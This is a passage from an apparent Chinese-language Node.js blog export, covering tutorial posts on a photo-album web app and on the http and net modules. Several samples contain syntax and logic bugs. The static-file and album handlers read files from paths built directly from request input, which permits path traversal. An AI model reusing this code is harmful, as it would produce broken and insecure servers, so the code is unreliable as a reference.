req.query.albumName.trim() : ''; // 校验添加相册名称的合法性 \/:*?"&lt;&gt;| if (/(\\|\/|\:|\*|\?|"|\&lt;|\&gt;|\|)|^$/.test(albumName)) &#123; return res.end('albumName param invalid error.'); &#125; // 1. 万一 handler.js 不在项目的根路径下了 // 2. 万一 上传的目录不想叫 uploads // 3. 万一 上传的路径不在 uploads 中 // 由于在多个地方都会使用到 uploads 目录的路径，所以以上三种可能万一变化，就要手动全部修改 // 所以这里就把可能变化并且多个地方引用的元素放到了 config.js 配置文件中 // 这样的话在使用的时候，就通过 config.js 配置文件来拿 // 好处就是：只要配置文件中的属性发生了变化，那么所有使用了该属性的地方都会跟着变 fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (!err) &#123; // 如果没有错误发生，说明该相册目录已存在 return res.end('albumName already exists'); &#125; fs.mkdir(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; throw err; &#125; // 跳转页面，302 重定向 // 当浏览器收到 302 状态码的时候，浏览器会自动找到相应报文中的 Location // 对 Loacation 指向的地址发起请求 // '/' 表示当前网站的根路径 res.writeHead(302, &#123; 'Location': '/' &#125;); res.end(); &#125;); &#125;);&#125;;/** * GET /album * query: &#123; albumName: 'xxx' &#125; */// 首先在 index.html 里面修改 a 标签的连接exports.showAlbum = (req, res) =&gt; &#123; // 1. 解析接收客户端提交的数据 // 2. 根据数据处理客户端请求 // 3. 对处理结果发送响应 const albumName = req.query.albumName ? req.query.albumName.trim() : ''; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; return res.end('album not exists.'); &#125; fs.readdir(path.join(config.uploadDir, albumName), (err, files) =&gt; &#123; if (err) &#123; throw err; &#125; fs.readFile(path.join(config.viewPath, 'album.html'), 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; const result = _.template(data)(&#123; albumName: albumName, albumPaths: files.map(fileName =&gt; `/uploads/$&#123;albumName&#125;/$&#123;fileName&#125;`) &#125;); res.writeHead(200, &#123; 'Content-Type': "text/html; charset=utf-8" &#125;); res.end(result); &#125;); &#125;); &#125;);&#125;;/** * POST /upload * query &#123; albumName: 'xxx' &#125; */exports.doUpload = (req, res) =&gt; &#123; // 1. 解析表单提交数据：这里使用 formidable 解析表单 post 文件提交 // formidable 文档：album/node_modules/formidable/Readme.md // 2. 处理客户端请求 // 3. 根据处理结果发送响应 const albumName = req.query.albumName ? req.query.albumName : ''; fs.access(path.join(config.uploadDir, albumName), err =&gt; &#123; if (err) &#123; return res.end('album not exists'); &#125; const form = new formidable.IncomingForm(); // 自定义文件上传的路径 form.uploadDir = path.join(config.uploadDir, albumName); // formidable 默认会去掉扩展名，这里配置为保留文件的扩展名 form.keepExtensions = true; // 限制上传数据的大小，单位是字节 form.maxFieldsSize = 10 * 1024 * 1024; // fields 就是 formidable 解析到的普通字段数据 // files 是一个一个的文件信息对象 // formidable 会自动将上传的文件解析到当前操作系统的临时目录 // 它会把帮你解析完并且保存的文件的路径、文件名等信息作为对象的形式挂载给 files 参数 form.parse(req, (err, fields, files) =&gt; &#123; if (err) &#123; return res.end('The default size is 10MB.'); &#125; // 封装了重定向函数 res.redirect(encodeURI(`/album?albumName=$&#123;albumName&#125;`)); &#125;); &#125;);&#125;;/* 以下关于注册的处理函数是为了演示如何使用 node 处理普通表单 POST 请求 */exports.showRegister = (req, res) =&gt; &#123; fs.readFile(path.join(config.viewPath, 'register.html'), (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.end(data); &#125;);&#125;;exports.doRegister = (req, res) =&gt; &#123; let buffers = []; // 监听 req 对象的 data 事件 和 end 事件 req.on('data', data =&gt; &#123; buffers.push(data); &#125;); // 基本用不到 req.on('end', () =&gt; &#123; const file = Buffer.concat(buffers); fs.writeFile('./a', file, err =&gt; &#123; if (err) &#123; throw err; &#125; console.log('writed success'); &#125;); console.log(file.length); // console.log(qstring.parse(body)); &#125;);&#125;; config.js12345const path = require('path');module.exports = &#123; uploadDir: path.join(__dirname, 'uploads'), viewPath : path.join(__dirname, 'views')&#125;; 处理普通表单 POST 提交（没有文件的表单） 表单会将表单中的所有具有 name 的 input 中的 name 和 value 按照 name=value&amp;name=value，这样的形式拼接成一个查询字符串，然后将查询字符串放到请求报问体中。 请求头 请求首行 请求首部字段 空行 请求体 name=value&amp;name=value 处理有文件的表单 POST 提交 请求方法必须是 post 将表单的 enctype 设置为 multipart/form-data 表单会把普通字段（不是文件，具有name的input）和文件，否放到请求报问体中。 注意：这里的请求报问体中就不是查询字符串了，所以后台通过查询字符串的解析方式就解析不到了 如何解析： 在 Node 后台，可以使用一个第三方包：formidable 来辅助解析有文件的表单提交 使用文档可以查看：album/node_modules/formidable/Readme.md 简单登录页（仅仅用来案例演示） 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;用户登陆&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="/register" method="post" enctype="multipart/form-data"&gt; &lt;p&gt; &lt;label for=""&gt;用户名&lt;/label&gt; &lt;input type="text" name="username"&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=""&gt;密码&lt;/label&gt; &lt;input type="password" name="password"&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=""&gt;是否同意&lt;/label&gt; &lt;input type="checkbox" name="agree"&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=""&gt;性别&lt;/label&gt; &lt;input type="radio" value="1" name="gender"&gt;男 &lt;input type="radio" value="0" name="gender"&gt;女 &lt;/p&gt; &lt;p&gt; &lt;label for=""&gt;头像&lt;/label&gt; &lt;input type="file" name="avatar"&gt; &lt;/p&gt; &lt;p&gt; &lt;input type="submit" value="点击注册"&gt; &lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>小项目</tag>
        <tag>Underscore</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-相册小项目（上）]]></title>
    <url>%2F2017%2F01%2F26%2FNode-%E7%9B%B8%E5%86%8C%E5%B0%8F%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
    <content type="text"><![CDATA[完成相册新建、上传图片等简单的功能小项目。 项目初始化 把前端用到的静态资源放到 public 目录下 把所有的页面都放到 views 目录下 在项目根路径下创建一个 app.js 作为后台的启动入口 使用 npm 安装和管理项目的依赖项 将所有的相册放到项目根路径下的 uploads目录小 划分哪些资源公共开放 public css js img uploads node_modules 设计路由 请求方法 请求路径 响应处理 GET / views/index.html GET /album views/album.html GET /album/add 处理添加相册请求 POST /upload 处理照片上传请求 处理相册静态资源123456789101112131415161718192021222324252627282930313233343536373839const http = require('http');const fs = require('fs');const path = require('path');const url = require('url');const mime = require('mime');http .createServer() .on('request', (req, res) =&gt; &#123; // 指定第二个参数，parse 方法会将查询字符串解析为一个对象挂载给返回结果的 query 属性 // 该方法，会将一个完整的 url 路径解析为一个对象，方便我们取各个部分的数据 const urlObj = url.parse(req.url, true); const pathname = urlObj.pathname; // 拿到请求路径，不包含查询字符串 const queryObj = urlObj.query; // 拿到通过 url.parse 方法解析出来的查询字符串（已经自动转为对象了） if (pathname === '/') &#123; fs.readFile('./views/index.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125;); &#125; else if (pathname.startsWith('/public/') || pathname.startsWith('/uploads/') || pathname.startsWith('/node_modules/')) &#123; fs.readFile(`.$&#123;pathname&#125;`, (err, data) =&gt; &#123; if (err) &#123; res.writeHead(404, 'Not Found'); res.end(); &#125; res.writeHead(200, &#123; 'Content-Type': mime.lookup(pathname) &#125;) res.end(data); &#125;); &#125; &#125;) .listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.'); &#125;); 路由：根据不同的请求路径做处理。app.js 12345678910const http = require('http');const router = require('./router');http .createServer() .on('request', (req, res) =&gt; &#123; router(req, res); &#125;) .listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.'); &#125;); 提取的路由模块 router.js 1234567891011121314151617181920212223242526272829303132const fs = require('fs');const path = require('path');const url = require('url');const mime = require('mime');module.exports = funciton(req, res) &#123; const urlObj = url.parse(req.url, true); const pathname = urlObj.pathname; const queryObj = urlObj.query; // 一个请求对应了一个处理流程代码 if (pathname === '/') &#123; fs.readFile('./views/index.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125;); &#125; else if (pathname.startsWith('/public/') || pathname.startsWith('/uploads/') || pathname.startsWith('/node_modules/')) &#123; fs.readFile(`.$&#123;pathname&#125;`, (err, data) =&gt; &#123; if (err) &#123; res.writeHead(404, 'Not Found'); res.end(); &#125; res.writeHead(200, &#123; 'Content-Type': mime.lookup(pathname) &#125;) res.end(data); &#125;); &#125;&#125; 再次封装处理请求的代码, 处理模块，暴漏一系列的方法router.js 12345678910111213141516const fs = require('fs');const path = require('path');const url = require('url');const mime = require('mime');const handler = require('./handler');module.exports = funciton(req, res) &#123; const urlObj = url.parse(req.url, true); const pathname = urlObj.pathname; const queryObj = urlObj.query; // 一个请求对应了一个处理流程代码 if (pathname === '/') &#123; handler.showIndex(req, res); &#125; else if (pathname.startsWith('/public/') || pathname.startsWith('/uploads/') || pathname.startsWith('/node_modules/')) &#123; handler.showPublic(req, res); &#125;&#125; hander.js 1234567891011121314151617181920212223242526272829const fs = require('fs');// 处理渲染首页exports.showIndex = (req, res) =&gt; &#123; fs.readFile('./views/index.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125;);&#125;;// 处理添加相册// 处理渲染相册页面// 处理上传照片请求// 处理静态资源请求exports.showPublic = (req, res) =&gt; &#123; fs.readFile(`.$&#123;req.url&#125;`, (err, data) =&gt; &#123; if (err) &#123; res.writeHead(404, 'Not Found'); res.end(); &#125; res.writeHead(200, &#123; 'Content-Type': mime.lookup(req.url) &#125;) res.end(data); &#125;);&#125;; 模块清晰-职责单一 客户端 -&gt; app.js (1.启动服务器; 2. 将请求传递到 router 模块中) -&gt; router.js 路由模块 (根据不同的请求路径调用不同的处理函数) -&gt; handler.js 请求处理函数 使用模板引擎template.js （先看有关 underscore 模板的使用的小例子） 12345678910111213141516171819const _ = require('underscore');// 1. 将模板字符串传递给 _.template 方法// 该方法返回一个编译函数// 2. 调用编译函数，传入要注入的数据对象const complied = _.template(`hello &lt;%= name %&gt;&lt;ul&gt; &lt;% fruits.forEach(function (fruit))&#123; %&gt; &lt;li&gt;&lt;%= fruit %&gt;&lt;li&gt; &lt;% &#125;) %&gt;&lt;/ul&gt;`);console.log(complied(&#123; name: "Hiraku", fruits: [ '栗子', '苹果', '橙子' ]&#125;)); 现在将模板字符串利用读文件的方式读出来。(tpt.html) 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;ul&gt; &lt;% fruits.forEach(function (fruit))&#123; %&gt; &lt;li&gt;&lt;%= fruit %&gt;&lt;li&gt; &lt;% &#125;) %&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 现在可以这样写 template.js 123456789101112131415const _ = require('underscore');const fs = require('fs');fs.readFile('./tpl.html', 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; const complied = _.template(data); console.log(complied(&#123; fruits: [ '栗子', '苹果', '橙子' ] &#125;));&#125;); 完成首页渲染相册表功能app.js 12345678910const http = require('http');const router = require('./router');http .createServer() .on('request', (req, res) =&gt; &#123; router(req, res); &#125;) .listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.'); &#125;); hander.js 123456789101112131415161718192021222324252627282930313233343536373839const fs = require('fs');const _ = require('underscore');const url = require('mine')// 处理渲染首页exports.showIndex = (req, res) =&gt; &#123; fs.readdir('./uploads', (err, files) =&gt; &#123; if (err) &#123; throw err; &#125; fs.readFile('./views/index.html', 'utf8', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; const result = _.template(data)( albumNames: files ); res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(result); &#125;); &#125;);&#125;;// 处理添加相册// 处理渲染相册页面// 处理上传照片请求// 处理静态资源请求exports.showPublic = (req, res) =&gt; &#123; fs.readFile(`.$&#123;req.url&#125;`, (err, data) =&gt; &#123; if (err) &#123; res.writeHead(404, 'Not Found'); res.end(); &#125; res.writeHead(200, &#123; 'Content-Type': mime.lookup(req.url) &#125;) res.end(data); &#125;);&#125;; router.js 1234567891011121314const path = require('path');const url = require('url');const handler = require('./handler');module.exports = funciton(req, res) &#123; const urlObj = url.parse(req.url, true); const pathname = urlObj.pathname; const queryObj = urlObj.query; // 一个请求对应了一个处理流程代码 if (pathname === '/') &#123; handler.showIndex(req, res); &#125; else if (pathname.startsWith('/public/') || pathname.startsWith('/uploads/') || pathname.startsWith('/node_modules/')) &#123; handler.showPublic(req, res); &#125;&#125; ./views/index.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;我的相册&lt;/title&gt; &lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt; &lt;link rel="stylesheet" href="node_modules/bootstrap/dist/css/bootstrap.css"&gt; &lt;link rel="stylesheet" href="public/css/main.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="container-fluid"&gt; &lt;nav class="navbar navbar-default"&gt; &lt;div class="container-fluid"&gt; &lt;div class="navbar-header"&gt; &lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"&gt; &lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class="navbar-brand" href="/"&gt;我的相册&lt;/a&gt; &lt;/div&gt; &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt; &lt;ul class="nav navbar-nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;首页 &lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class="nav navbar-nav navbar-right"&gt; &lt;li&gt; &lt;a href="" data-toggle="modal" data-target="#exampleModal" data-whatever="@mdo"&gt;新建相册&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/div&gt; &lt;div class="container"&gt; &lt;!-- 使用模板引擎 --&gt; &lt;div class="row"&gt; &lt;% albumNames.forEach(function(albumName)&#123; %&gt; &lt;div class="col-xs-6 col-md-3"&gt; &lt;a href="#" class="thumbnail"&gt; &lt;img src="public/img/icon.png" alt=""&gt; &lt;/a&gt; &lt;div class="caption"&gt; &lt;h3&gt;&lt;%= albumName %&gt;&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;% &#125;) %&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"&gt; &lt;div class="modal-dialog" role="document"&gt; &lt;div class="modal-content"&gt; &lt;form action="/" method="post"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"&gt;&lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; &lt;h4 class="modal-title" id="exampleModalLabel"&gt;新建相册&lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; &lt;div class="form-group"&gt; &lt;label for="recipient-name" class="control-label"&gt;相册名称:&lt;/label&gt; &lt;input type="text" class="form-control" name="albumName" placeholder="请输入相册名称"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭&lt;/button&gt; &lt;button type="submit" class="btn btn-success"&gt;点击添加&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src="node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script src="node_modules/bootstrap/dist/js/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 请求处理模块调用流程图]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>小项目</tag>
        <tag>Underscore</tag>
        <tag>mine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-http-网站]]></title>
    <url>%2F2017%2F01%2F16%2FNode-http-%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议 接收请求处理请求发送响应net 为什么不能处理浏览器的响应呢？ http 模块和 net 模块之间的区别 http 模块的简单使用(1). 创建服务器，得到一个 Server 实例对象 任何请求都会触发该 request 请求事件，然后执行事件处理函数 也就是说所有的请求入口就是这个 request 事件 如何区分不同的请求 每个请求有请求报文: 请求头、请求路径、请求方法等信息 Node 将每一个请求中的请求报文信息解析为一个对象：Request ，挂载给请求处理函数的第一个参数 也就是说可以通过 Request 请求对象拿到一些请求报文信息，例如请求方法、请求路径、请求头部字段等信息 同时，Node 还提供了一个接口对象：Response 该对象可以用来给当前请求发送响应数据(2). 监听服务器 Server 对象的 Request 请求事件，设置请求处理函数 (3). 绑定监听端口，启动服务器，设置启动成功之后的回调处理函数 123456789101112// 导入 http 模块const http = require('http');// 创建 http 服务器const server = http.createServer(); // 监听 request 事件server.on('request', (req, res) =&gt; &#123; res.end('hello world');&#125;);// 开启服务端口server.listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.');&#125;); 对不同的请求发送不同的响应 当用户访问 &#39;/&#39; 的时候，返回 index page 当用户访问 &#39;/add&#39; 的时候，返回 add page 当用户访问 &#39;/about&#39; 的时候，返回 about page 当用户访问 &#39;/xxx&#39; 的时候，返回 404 (1). 获取当前的请求路径（通过 Request 请求对象的 url 属性获取） 这里的请求路径永远都是以 / 开头的 例如你在浏览器地址中输入的是: http://127.0.0.1:3000 则 url 就是 / http://127.0.0.1:3000/ 则 url 就是 / http://127.0.0.1:3000/add 则 url 就是 /add (2). 发送响应 2.1 请求之后，可以使用 res.write 方法发送响应 2.2 注意：res.write 可以向响应流中多次发送数据， 但是一定要在写完响应流数据之后调用 res.end() 方法结束响应。 否则客户端浏览器还认为你的数据没有发送完毕，一直等待接收。 2.3 一般发送响应数据的时候，很少有这种需要多次调用 write 方法来发送的数据 就是说一般就是 res.write(&#39;响应数据&#39;), res.end() 结束响应 所以，可以使用 res.end(&#39;响应数据&#39;) 直接发送响应数据，同时结束响应 1234567891011const http = require('http');const server = http.createServer();server.on('request', (req, res) =&gt; &#123; const url = req.url; // res.write(url); // res.end(); res.end(url);&#125;);server.listen(3000, () =&gt; &#123; console.log('Server is running at port 3000...');&#125;); 根据不同请求响应不同内容因此，可以这样来判断 1234567891011121314151617const http = require('http');const server = http.createServer();server.on('request', (req, res) =&gt; &#123; const url = req.url; if (url === '/') &#123; res.end('&lt;h1&gt;index page&lt;/h1&gt;'); &#125; else if (url === '/add') &#123; res.end('&lt;h1&gt;add page&lt;/h1&gt;'); &#125; else if (url === '/about') &#123; res.end('about page'); &#125; else &#123; res.end('404 Not Found.'); &#125;&#125;);server.listen(3000, () =&gt; &#123; console.log('Server is running at port 3000...');&#125;); 处理页面中的静态资源上面这段代码表示可以解析 html 字符串，那也可以响应页面。 如果要处理一些读取出来的 html 字符串，那读文件的时候就指定编码或者调用 data.toString() 方法转为字符。 这里因为不处理字符串，所以就不转字符 res.end() 只能接收 二进制数据或者 字符串，其它都报错 如果传递的字符串，则发送响应的时候，还会自动将字符串转为二进制再发送 如果直接就传递的是二进制数据，则直接发送 当客户端浏览器收到发送的响应数据的时： 浏览器会先查看响应报文头中的 Content-Type 中的 charset 编码，然后根据该编码解析数据 如果响应报文头中没有 Content-Type 那么浏览器则根据 HTML 结构中的 &lt;meta charset=&quot;UTF-8&quot;&gt; 来解析数据 可以通过 res.writeHead 方法在结束响应之前，写响应头 查询网址：http://tool.oschina.net/commons 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const http = require('http');const fs = require('fs');const server = http.createServer();server.on('request', (req, res) =&gt; &#123; const url = req.url; if (url === '/') &#123; fs.readFile('.data/index.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; &#125;); // 在结束响应之前，写响应头，指定charset 编码 res.writeHead(202, 'OK', &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125; else if (url === '/add') &#123; fs.readFile('.data/add.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; &#125;); res.writeHead(202, 'OK', &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125; else if (url === '/about') &#123; res.writeHead(200, 'OK', &#123; 'Content-Type': 'text/plain; charset=utf-8' &#125;) res.end('about page'); &#125; else &#123; fs.readFile('.data/404.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; &#125;); res.writeHead(404, 'Not Found', &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;) res.end(data); &#125; &#125;);server.listen(3000, () =&gt; &#123; console.log('Server is running at port 3000...');&#125;); 处理页面中的动态资源和静态资源同一个页面中有多个外链，不是指 a 标签。 当浏览器获取到当前响应的 HTML 格式字符串之后，浏览器从上到下依次解析字符串（HTML 结构文档）。 在解析的过程中，如果发现有 link img script iframe 等具有 src 或 href 的标签：a 标签和他们不一样，a 标签是用来跳转的，资源在另一个页面。则，浏览器主动对该资源指向的地址发起请求 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const http = require('http');const fs = require('fs');const path = require('path');http .createServer() .on('request', (req, res) =&gt; &#123; const url = req.url; if (url === '/') &#123; fs.readFile('./data/static/index.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125;); &#125; else if (url === '/css/main.css') &#123; fs.readFile('./data/static/css/main.css', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/css; charset=utf-8' &#125;); res.end(data); &#125;); &#125; else if (url === '/img/96102-106.jpg') &#123; fs.readFile('./data/static/img/96102-106.jpg', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'image/jpeg' &#125;); res.end(data); &#125;); &#125; else if (url === '/js/main.js') &#123; fs.readFile('./data/static/js/main.js', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'application/x-javascript; charset=utf-8' &#125;); res.end(data); &#125;); &#125; &#125;) .listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.'); &#125;); index.html 文档内容 123456789101112131415161718&lt;!-- src: ./data/static/index.html --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;!-- http://127.0.0.1:3000/css/main.css --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/main.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/a.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;首页&lt;/h1&gt; &lt;!-- http://127.0.0.1:3000/img/96102-106.jpg --&gt; &lt;img src=&quot;img/96102-106.jpg&quot; alt=&quot;&quot;&gt; &lt;!-- http://127.0.0.1:3000/js/main.js --&gt; &lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 解决静态资源的 mime 类型 ‘Content-Type’: mime.lookup(url); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162const http = require('http');const fs = require('fs');const path = require('path');const mime = require('mime');http .createServer() .on('request', (req, res) =&gt; &#123; // / index.html // /add add.html // /404 404.html // http://127.0.0.1:3000/public/css/main.css // http://127.0.0.1:3000/public/js/main.js const url = req.url if (url === '/') &#123; fs.readFile('./views/index.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125;); &#125; else if (url.startsWith('/public/')) &#123; // /public/css/main.css // /public/js/main.js fs.readFile(`.$&#123;url&#125;`, (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; // Content-Type ？ // 无论是任何资源，都最好要有 Content-Type res.writeHead(200, &#123; 'Content-Type': mime.lookup(url); &#125;); res.end(data); &#125;); &#125; else if (url === '/add') &#123; fs.readFile('./views/add.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125;); &#125; else &#123; fs.readFile('./views/404.html', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; res.writeHead(200, &#123; 'Content-Type': 'text/html; charset=utf-8' &#125;); res.end(data); &#125;); &#125; &#125;) .listen(3000, () =&gt; &#123; console.log('Server is running at port 3000.'); &#125;); ./views/index.html 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel="stylesheet" href="public/css/main.css"&gt; &lt;link rel="stylesheet" href="public/css/a.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;首页&lt;/h1&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;script src="public/js/main.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; http 和 net 的区别与联系解释浏览器和服务器的交互本质： 本质上就是浏览器通过 Socket 和 服务器 Socket 进行通信 双方都通过 HTTP 协议进行交流 net 模块就是传输层的一个模块，只是为了纯粹的收发数据 http 模块构建与 net 模块之上，只不过对于收发的数据会进行解析和包装 所有的BS模型都是使用的 HTTP 协议进行数据的解析和包装 一下代码仅仅用来说明 net 和 HTTP 之间的联系与区别，没有实际应用意义。 1234567891011121314151617181920212223242526272829303132333435363738394041424344const net = require('net');net .createServer(); .on('connection', socket =&gt; &#123; socket.on('data', data =&gt; &#123; // console.log(data.toString()) // 自己动手解析请求报文 // 1. 按照空行将请求体和请求报文分割 // 2. 按照换行将请求头分割 // 数组中第 0 项就是请求首行 // 其它所有项都是请求首部字段 console.log(socket.remoteAddress, socket.remotePort); data = data.toString(); const requestContext = data.split('\r\n\r\n'); const requestHead = requestContext[0]; const requestBody = requestContext[1]; const req = &#123;&#125;; // url method httpVersion // headers // &#123; key: value, key:value &#125; 给在给 req 对象的 headers const requestHeadFirst = requestHead.split('\r\n')[0].split(' '); req.method = requestHeadFirst[0]; req.url = requestHeadFirst[1]; req.httpVersion = requestHeadFirst[2]; req.headers = &#123;&#125;; const requestHeadFileds = requestHead.split('\r\n').slice(1); for (let item of requestHeadFileds) &#123; const tmp = item.split(': '); req.headers[tmp[0]] = tmp[1]; &#125; // net 模块中发送数据只是纯粹的发送你传入的字符串，有一行空白行。 socket.write(`HTTP/1.1 200 OKServer: ItcastConnection: keep-alivefoo: barContent-Type: text/html; charset=utf-8&lt;h1&gt;hello world&lt;/h1&gt;`); socket.end(); &#125;); &#125;) .listen(3000, () =&gt; &#123; console.log('server is running at port 3000.') &#125;); 当在浏览器地址栏输入了一个地址：http://127.0.0.1:3000/ 浏览器按照 HTTP 协议将你输入的地址包装成 HTTP 请求报文，内容如下： 123456789GET / HTTP/1.1Host: 127.0.0.1:3000Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8 请求报文格式如下： 请求头 请求首行 请求方法 请求路径 HTTP协议版本 请求首部字段 首都字段中放一些额外的附加信息 例如 User-Agent 表示告诉服务器我这个客户端是什么 这里为什么有各种浏览器的标识 原因在早期的网页有各种各样兼容性问题 这个字段还可以用来统计浏览器的使用量占比情况 Accept 早期的 HTTP 0.9 中，只能收发普通字符数据 不支持图片等富文本信息 历史原因，现代的服务器和客户端浏览器已经不需要这个东西 空行 请求体 如果是 post 请求才有请求体 如果有请求体，则请求体是在请求头的回车换行之后 如果没有，也会有一个空行存在 响应报文： 响应头 响应首行 HTTP协议版本 状态码 状态短语 响应首部字段 空行 响应体 所有的响应数据都在响应头之后的空行之后 net 和 http 模块的关系： http 模块是构建与 net 模块之上的 http 中的收发数据还是通过 net 模块中的 Socket 收发数据的 http 会将收发的数据按照 HTTP 协议自动帮你解析和包装 例如 http 模块自动将请求报文解析出来，然后挂载给了 req 请求对象 你可以通过 req 请求对象去拿到你想要的信息 为什么既有 net 又有 http 呢？ http 只是一个基于 net 